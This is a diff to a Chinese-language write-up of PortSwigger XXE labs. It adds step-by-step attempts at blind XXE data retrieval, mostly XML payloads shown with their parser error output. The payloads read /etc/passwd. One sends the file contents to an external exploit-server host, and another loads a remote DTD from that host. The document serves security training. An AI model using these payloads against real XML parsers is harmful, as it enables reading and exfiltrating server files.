@@ -12,7 +12,7 @@ description: PortSwigger XML external entity (XXE) injection
 
 先看一下正常的 XML Payload
 
-```html
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <stockCheck>
   <productId>2</productId>
@@ -145,6 +145,140 @@ fetch(
 | --------- | ------------------------------------------------------------------------------------------------------- |
 | Document  | https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages |
 | Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages           |
+
+嘗試
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+<stockCheck><productId>%eval;</productId><storeId>%error;</storeId></stockCheck>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+]>
+<stockCheck>
+    <productId>%eval;</productId>
+    <storeId>%error;</storeId>
+</stockCheck>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+    %eval;
+    %error;
+]>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % hello "<!ENTITY &#x25; world SYSTEM 'file:///nonexistent/%file;'>">
+    %hello;
+    %world;
+]>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % hello "<!ENTITY &#x25; world SYSTEM 'file:///nonexistent/%file;'>">
+    %hello;
+]>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % hello "<!ENTITY &#x25; world SYSTEM 'file:///nonexistent/%file;'>">
+]>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % hello "<!ENTITY &#x25;>">
+]>
+```
+
+=> `"Entities are not allowed for security reasons"`
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+]>
+```
+
+=> `"XML parser exited with error: org.xml.sax.SAXParseException; lineNumber: 4; columnNumber: 3; Premature end of file."`
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    %file;
+]>
+```
+
+=> `"XML parser exited with error: org.xml.sax.SAXParseException; systemId: file:///etc/passwd; lineNumber: 1; columnNumber: 1; The markup declarations contained or pointed to by the document type declaration must be well-formed."`
+
+在 exploit-server 定義
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0af6007c0389b3028050c0f0014900f4.exploit-server.net/?%file;'>">
+%eval;
+%exfil;
+```
+
+Client 端
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % dtd SYSTEM "https://exploit-0af6007c0389b3028050c0f0014900f4.exploit-server.net/exploit">
+    %dtd;
+]>
+```
+
+=> `"XML parser exited with error: java.net.MalformedURLException: Illegal character in URL"`
+
+感覺快成功了，回到題目本身，是說要用 error message，所以修改 exploit-server 的 body
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%exfil;
+```
+
+## Lab: Exploiting XXE to retrieve data by repurposing a local DTD
+
+| Dimension | Description                                                                                           |
+| --------- | ----------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd        |
+| Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd |
+
+## 名詞介紹
 
 ## 參考資料
 
